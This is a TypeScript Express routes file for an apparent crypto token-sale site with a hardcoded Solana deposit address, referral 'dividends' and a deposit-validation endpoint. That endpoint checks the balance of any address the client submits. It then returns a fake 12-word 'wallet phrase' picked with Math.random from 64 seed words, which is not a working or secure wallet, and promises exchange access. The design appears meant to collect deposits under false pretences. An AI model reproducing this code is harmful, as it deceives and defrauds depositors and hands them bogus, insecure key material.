import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertPurchaseSchema } from "@shared/schema";
import QRCode from "qrcode";
import fetch from "cross-fetch";

export async function registerRoutes(app: Express): Promise<Server> {
  // Get token statistics
  app.get("/api/stats", async (req, res) => {
    try {
      const stats = await storage.getTokenStats();
      res.json(stats);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch token statistics" });
    }
  });

  // Get price history
  app.get("/api/price-history", async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 24;
      const history = await storage.getPriceHistory(limit);
      res.json(history);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch price history" });
    }
  });

  // Calculate purchase preview
  app.post("/api/calculate-purchase", async (req, res) => {
    try {
      const { amount } = req.body;
      
      if (!amount || amount <= 0) {
        return res.status(400).json({ message: "Invalid purchase amount" });
      }

      const stats = await storage.getTokenStats();
      const bdcAmount = amount / stats.currentPrice;
      const newPrice = await storage.calculateNewPrice(stats.currentPrice, amount);

      res.json({
        bdcAmount: parseFloat(bdcAmount.toFixed(4)),
        currentPrice: stats.currentPrice,
        newPrice: parseFloat(newPrice.toFixed(4)),
        priceIncrease: parseFloat((newPrice - stats.currentPrice).toFixed(6)),
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to calculate purchase" });
    }
  });

  // Create purchase
  app.post("/api/purchase", async (req, res) => {
    try {
      const validatedData = insertPurchaseSchema.parse(req.body);
      const purchase = await storage.createPurchase(validatedData);
      
      // Add to price history
      await storage.addPriceHistory(validatedData.price, 0.0027);
      
      res.json(purchase);
    } catch (error) {
      res.status(400).json({ message: "Invalid purchase data" });
    }
  });

  // Generate QR code for deposit address
  app.get("/api/qr-code", async (req, res) => {
    try {
      const depositAddress = "FcRRT7yLx3dZV6kD2N5cWU9UG6TxPm99azsxNUUzQNmx";
      const qrCodeDataURL = await QRCode.toDataURL(depositAddress, {
        width: 200,
        margin: 2,
        color: {
          dark: '#000000',
          light: '#FFFFFF'
        }
      });
      
      res.json({ qrCode: qrCodeDataURL, address: depositAddress });
    } catch (error) {
      res.status(500).json({ message: "Failed to generate QR code" });
    }
  });

  // Generate random purchase amount
  app.get("/api/random-amount", async (req, res) => {
    try {
      const min = parseFloat(req.query.min as string) || 10;
      const max = parseFloat(req.query.max as string) || 1000;
      const randomAmount = parseFloat((Math.random() * (max - min) + min).toFixed(4));
      
      res.json({ amount: randomAmount });
    } catch (error) {
      res.status(500).json({ message: "Failed to generate random amount" });
    }
  });

  // Validate deposit to USDC address
  app.post("/api/validate-deposit", async (req, res) => {
    try {
      const { address, expectedAmount, email, referralCode } = req.body;
      
      if (!address || !expectedAmount || !email) {
        return res.status(400).json({ message: "Missing required fields" });
      }

      // Menggunakan Solana RPC untuk mengecek balance USDC di alamat tersebut
      const solanaRPCUrl = "https://api.mainnet-beta.solana.com";
      const usdcMintAddress = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; // USDC mint address di Solana
      
      try {
        // Cek token account untuk USDC
        const response = await fetch(solanaRPCUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            jsonrpc: '2.0',
            id: 1,
            method: 'getTokenAccountsByOwner',
            params: [
              address,
              {
                mint: usdcMintAddress,
              },
              {
                encoding: 'jsonParsed',
              },
            ],
          }),
        });

        const data = await response.json();
        
        if (data.result && data.result.value && data.result.value.length > 0) {
          // Ambil balance USDC dari token account
          const tokenAccount = data.result.value[0];
          const balance = tokenAccount.account.data.parsed.info.tokenAmount.uiAmount;
          
          // Cek apakah balance sesuai dengan expected amount (dengan toleransi 0.001)
          const tolerance = 0.001;
          if (Math.abs(balance - expectedAmount) <= tolerance) {
            // Generate 12 phrase mnemonic words hanya jika deposit benar-benar valid
            const mnemonicWords = [
              "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract",
              "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
              "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual",
              "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance",
              "advice", "aerobic", "affair", "afford", "afraid", "again", "agent", "agree",
              "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol",
              "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha",
              "already", "also", "alter", "always", "amateur", "amazing", "among", "amount"
            ];
            
            const walletPhrase = Array.from({ length: 12 }, () => 
              mnemonicWords[Math.floor(Math.random() * mnemonicWords.length)]
            );

            // Create or update user with deposit status and referral info
            let user = await storage.getUserByEmail(email);
            let newReferralCode = null;
            
            if (!user) {
              // Generate referral code for new user
              newReferralCode = await storage.generateReferralCode();
              user = await storage.createUser({
                email,
                referralCode: newReferralCode,
                hasDeposited: "true",
                walletPhrase,
              });
            } else {
              // Update existing user
              await storage.updateUserDepositStatus(email, true);
              if (!user.referralCode) {
                newReferralCode = await storage.generateReferralCode();
              }
            }

            // Check referral rewards if referral code was provided
            let referralMessage = "";
            if (referralCode) {
              const referrer = await storage.getUserByReferralCode(referralCode);
              if (referrer) {
                referralMessage = `Referral reward (10% dividen) will be credited to ${referrer.email}`;
              }
            }

            // Create the purchase record
            const stats = await storage.getTokenStats();
            const bdcAmount = expectedAmount / stats.currentPrice;
            const purchase = await storage.createPurchase({
              amount: expectedAmount,
              price: stats.currentPrice,
              bdcAmount,
              email,
              referralCode: referralCode || null,
              transactionHash: null
            });

            res.json({
              isValid: true,
              actualAmount: balance,
              walletPhrase,
              userReferralCode: newReferralCode || user.referralCode,
              referralMessage,
              message: "Deposit confirmed successfully! Access to full exchange akan segera diberikan."
            });
          } else {
            res.json({
              isValid: false,
              message: `Balance found (${balance} USDC) but doesn't match expected amount (${expectedAmount} USDC). Please deposit the correct amount.`
            });
          }
        } else {
          res.json({
            isValid: false,
            message: "No USDC found in this address. Please make sure to deposit USDC to the provided address."
          });
        }
      } catch (fetchError) {
        console.error("Solana RPC Error:", fetchError);
        res.json({
          isValid: false,
          message: "Unable to check Solana network at this time. Please try again later."
        });
      }
    } catch (error) {
      console.error("Validation Error:", error);
      res.status(500).json({ message: "Failed to validate deposit" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
